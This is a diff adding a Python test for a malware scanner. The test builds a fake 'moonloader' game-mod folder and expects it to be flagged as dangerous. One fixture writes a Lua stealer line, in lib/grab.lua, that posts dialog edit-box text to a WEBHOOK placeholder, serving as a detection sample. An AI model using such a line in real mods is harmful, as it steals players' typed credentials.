@@ -205,3 +205,18 @@ def test_cab_is_opened(scan, tmp_path):
     report = scan("pack.cab", (tmp_path / "pack.cab").read_bytes())
     assert any(f.path == "pack.cab/setup.ps1" for f in report.files)
     assert report.verdict is not Verdict.CLEAN
+
+
+def test_folder_scan(tmp_path):
+    folder = tmp_path / "moonloader"
+    (folder / "lib").mkdir(parents=True)
+    (folder / "hud.lua").write_text("local imgui = require 'imgui'\nfunction main() wait(-1) end\n")
+    (folder / "lib" / "notes.txt").write_text("thanks for downloading")
+    (folder / "lib" / "grab.lua").write_text(
+        f"local r = require 'requests'\nfunction main() r.post('{WEBHOOK}', sampGetCurrentDialogEditboxText()) end\n")
+    (folder / "pack.zip").write_bytes(make_zip([("inner/readme.txt", b"hello")]))
+    report = scan_path(str(folder), ScanOptions(use_antivirus=False, use_yara=False))
+    paths = {f.path for f in report.files}
+    assert {"hud.lua", "lib/notes.txt", "lib/grab.lua", "pack.zip", "pack.zip/inner/readme.txt"} <= paths
+    assert report.verdict is Verdict.DANGEROUS
+    assert any(f.path == "lib/grab.lua" and f.severity is Severity.CRITICAL for f in report.findings)
